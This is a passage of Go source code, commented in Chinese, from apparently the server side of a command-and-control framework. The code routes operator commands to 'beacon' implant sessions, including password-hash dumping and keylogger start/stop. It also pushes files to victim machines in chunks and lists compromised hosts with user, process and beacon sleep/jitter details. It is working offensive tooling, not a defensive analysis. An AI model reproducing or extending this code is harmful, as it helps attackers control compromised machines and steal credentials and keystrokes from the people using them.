	if isHashdumpCommand(userCmd) {
		return v2SendHashdump(sess, userCmd)
	}

	class, alias, arg := v2Route(userCmd)

	// upload 需要服务端读文件后分块下发
	if strings.HasPrefix(strings.ToLower(strings.TrimSpace(userCmd)), "upload ") {
		return v2SendUpload(sess, userCmd)
	}

	id := sess.enqueue(class, alias, arg)
	if kind, detail, killable, bind, ok := bgJobClassify(userCmd); ok {
		if j := bgJobStart(sess.ID, kind, detail, 0, killable); j != nil && bind {
			bgJobBind(j.ID, id)
		}
	}
	// keylog stop 收尾对应的后台作业
	if f := strings.Fields(strings.TrimSpace(userCmd)); len(f) > 0 &&
		strings.EqualFold(f[0], "keylog") &&
		(len(f) > 1 && (strings.EqualFold(f[1], "stop") || f[1] == "0")) {
		bgJobEndByKind(sess.ID, "keylog", 0, "killed", "已停止键盘记录")
	}
	sess.pushOut("> " + userCmd)
	logf("[>] %s 下发 #%d class=0x%02x: %s", sess.ID, id, class, userCmd)
	eventLog("beacon", sess.ID, "命令", userCmd)
	return fmt.Sprintf("task#%d", id), nil
}

// upload <本地路径> [远端路径]
func v2SendUpload(sess *V2Session, userCmd string) (string, error) {
	fields := strings.Fields(userCmd)
	if len(fields) < 2 {
		return "", fmt.Errorf("用法: upload <本地路径> [远端路径]")
	}
	local := fields[1]
	data, err := os.ReadFile(local)
	if err != nil {
		return "", fmt.Errorf("读取本地文件失败: %v", err)
	}
	remote := local
	if len(fields) >= 3 {
		remote = fields[2]
	}
	if sess.upActive {
		return "", fmt.Errorf("上一个上传尚未完成")
	}
	sess.upActive = true

	go func() {
		defer func() { sess.upActive = false }()
		total := len(data)
		off := 0
		for off < total {
			n := chunkSize
			if off+n > total {
				n = total - off
			}
			arg := make([]byte, 0, 2+len(remote)+8+n)
			pl := make([]byte, 2)
			binary.BigEndian.PutUint16(pl, uint16(len(remote)))
			arg = append(arg, pl...)
			arg = append(arg, []byte(remote)...)
			meta := make([]byte, 8)
			binary.BigEndian.PutUint32(meta, uint32(total))
			binary.BigEndian.PutUint32(meta[4:], uint32(off))
			arg = append(arg, meta...)
			arg = append(arg, data[off:off+n]...)

			id := sess.enqueue(cmdFileUP, "upload", arg)
			logf("[>] %s 上传分块 #%d %d/%d", sess.ID, id, off+n, total)
			off += n
			time.Sleep(200 * time.Millisecond) // 让 beacon 有时间取走
		}
		sess.pushOut(fmt.Sprintf("> upload %s -> %s (%d 字节)\r\n", local, remote, total))
		eventLog("beacon", sess.ID, "上传", fmt.Sprintf("%s -> %s", local, remote))
	}()

	return "upload started", nil
}

// ---------------------------------------------------------------- REST

func v2SessionList() []map[string]interface{} {
	now := time.Now().Unix()
	out := []map[string]interface{}{}
	for _, s := range v2st.list() {
		out = append(out, map[string]interface{}{
			"sid":      s.ID,
			"proto":    "v2",
			"host":     s.Host,
			"user":     s.User,
			"arch":     s.Arch,
			"addr":     s.Addr,
			"idle":     now - s.Last,
			"pid":      s.PID,
			"ppid":     s.PPID,
			"proc":     s.Proc,
			"os":       s.OSVer,
			"sleep":    s.SleepMS,
			"jitter":   s.Jitter,
			"has_task": len(s.Queue) > 0,
		})
	}
	return out
}

// 供 server.go 的 handleCommand 调用: 若为 v2 会话则处理并返回 true
func v2TryCommand(w http.ResponseWriter, sid, cmd string) bool {
	sess := v2st.lookup(sid)
	if sess == nil {
		return false
	}
	res, err := v2SendCommand(sess, cmd)
	if err != nil {
		writeJSON(w, map[string]interface{}{"ok": false, "error": err.Error()})
		return true
	}
	writeJSON(w, map[string]interface{}{"ok": true, "mapped": res})
	return true
}

func v2TryOutput(w http.ResponseWriter, sid string, since int64) bool {
	sess := v2st.lookup(sid)
	if sess == nil {
		return false
	}
	writeJSON(w, map[string]interface{}{"ok": true, "items": sess.drain(since)})
	return true
}

// 日志辅助 (与 server.go 的 logf 一致)
var _ = log.Printf
